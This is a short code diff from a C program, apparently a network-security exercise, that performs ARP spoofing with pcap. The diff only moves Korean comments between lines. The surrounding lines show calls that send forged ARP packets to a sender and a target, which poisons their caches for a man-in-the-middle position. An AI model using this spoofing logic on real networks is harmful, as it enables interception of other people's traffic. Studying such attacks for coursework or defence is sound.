@@ -149,10 +149,10 @@ int main(int argc, char* argv[])
          //우선 sender1의 맥 주소를 알아내기 위해 sender와 arp request&reply 주고받기
         //target1의 맥 주소를 알아내기 위해 arp request 보내는 코드 추가
         
-        //sender1 MAC 주소 얻기 위해 arp request 보내기
+        //sender1 MAC 주소 얻기 위해 arp request 보내기(poisoning은 아니지만...)
         send_arp_poisoning(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].sender_ip);
         
-        //target1 MAC 주소 얻기 위해 arp request 보내기
+        //target1 MAC 주소 얻기 위해 arp request 보내기(poisoning은 아니지만...)
         send_arp_poisoning(pcap, my_MAC, BROADCAST_MAC, my_MAC, my_ip, UNKNOWN_MAC, pairs[i].target_ip);
         
 
@@ -201,9 +201,9 @@ int main(int argc, char* argv[])
 
         //여기서부터 arp spoofing 패킷 만들기
 
-        //sender1한테 한번 보내놓기(poisoning은 아니지만...)
+        //sender1한테 한번 보내놓기
         send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
-        //target1한테 한번 보내놓기(poisoning은 아니지만...)
+        //target1한테 한번 보내놓기
         send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip); 
 
         
